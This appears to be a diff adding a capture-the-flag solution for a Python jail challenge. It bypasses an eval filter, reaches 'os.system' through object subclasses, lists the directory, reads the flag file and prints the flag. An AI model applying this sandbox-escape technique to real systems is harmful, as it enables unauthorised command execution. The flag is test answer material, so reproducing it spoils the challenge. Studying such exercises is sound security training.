@@ -1,0 +1,23 @@
+a = print(eval(eval("inp"+eval.__doc__[3+1]+"t()")))
+
+# list subclasses
+"".__class__.__mro__[1].__subclasses__()
+
+
+# os._wrap_close to execute system("ls -al")
+"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__["system"]("ls -la")
+
+total 40
+drwxr-xr-x. 2 root root   131 Sep  3 18:27 .
+drwxr-xr-x. 3 root root    17 Jul 22 18:42 ..
+-rw-r--r--. 1 root root   220 Apr  4  2018 .bash_logout
+-rw-r--r--. 1 root root  3771 Apr  4  2018 .bashrc
+-rw-r--r--. 1 root root   807 Apr  4  2018 .profile
+-rw-r--r--. 1 root root    29 Aug 29 15:20 LOS7Z9XYZU8YS89Q24PPHMMQFQ3Y7RIE.txt
+-rwxr-xr-x. 1 root root  1328 Sep  3 18:27 pyjail.py
+-rwxr-xr-x. 1 root root 18744 Jul 22 18:50 ynetd
+
+# cat LOS7Z9XYZU8YS89Q24PPHMMQFQ3Y7RIE.txt
+"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__["system"]("cat LOS7Z9XYZU8YS89Q24PPHMMQFQ3Y7RIE.txt")
+
+ALLES{th1s_w4s_a_r34l_3sc4pe}
